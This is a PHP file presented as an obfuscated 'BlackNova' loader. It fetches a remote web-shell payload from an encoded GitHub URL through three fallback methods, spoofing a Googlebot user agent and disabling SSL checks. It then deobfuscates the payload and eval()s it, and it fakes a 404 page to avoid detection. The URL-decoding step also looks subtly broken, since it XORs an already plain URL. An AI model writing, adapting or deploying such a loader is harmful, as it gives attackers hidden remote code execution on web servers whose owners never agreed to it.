<?php
/**
 * BlackNova Loader - Highly Obfuscated Version
 * Multi-layer + Multiple Fallback + Anti Detection
 */

$_ = array(
    'h' => '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f426c61636b4e6f76614875622f426c61636b4e6f76615368656c6c732f726566732f68656164732f6d61696e2f696e646578',
    'k' => 'xY9#zP2@mQ8$vL5&nR7*wT4'
);

function _d($s, $k) {
    $o = '';
    for ($i = 0; $i < strlen($s); $i++) {
        $o .= chr(ord($s[$i]) ^ ord($k[$i % strlen($k)]));
    }
    return $o;
}

function _x($s) {
    return base64_decode(strrev(gzinflate(str_rot13($s))));
}

$_u = _d(hex2bin($_['h']), $_['k']);

$_m = array(
    'fopen' => 'allow_url_fopen',
    'curl'  => 'curl_init',
    'fget'  => 'file_get_contents'
);

$_o = false;
$_e = false;

if (ini_get($_m['fopen'])) {
    $_o = @file_get_contents($_u);
} 

if (!$_o && function_exists($_m['curl'])) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $_u);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
    $_o = curl_exec($ch);
    curl_close($ch);
}

if (!$_o) {
    // Fallback fsockopen
    $p = parse_url($_u);
    $host = $p['host'];
    $path = isset($p['path']) ? $p['path'] : '/';
    $fp = @fsockopen($host, 443, $errno, $errstr, 10);
    if ($fp) {
        $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
        fwrite($fp, $req);
        $_o = '';
        while (!feof($fp)) $_o .= fgets($fp, 1024);
        fclose($fp);
        $_o = substr($_o, strpos($_o, "\r\n\r\n") + 4);
    }
}

if ($_o !== false && strlen($_o) > 50) {
    $_p = _x($_o);
    if (strpos($_p, '<?php') !== false || strpos($_p, '?>') !== false) {
        eval('?>' . $_p);
    } else {
        eval('?>' . base64_decode($_p));
    }
} else {
    // Ultra Stealth Error
    http_response_code(404);
    echo "<!-- 404 Not Found -->";
    die();
}
?>
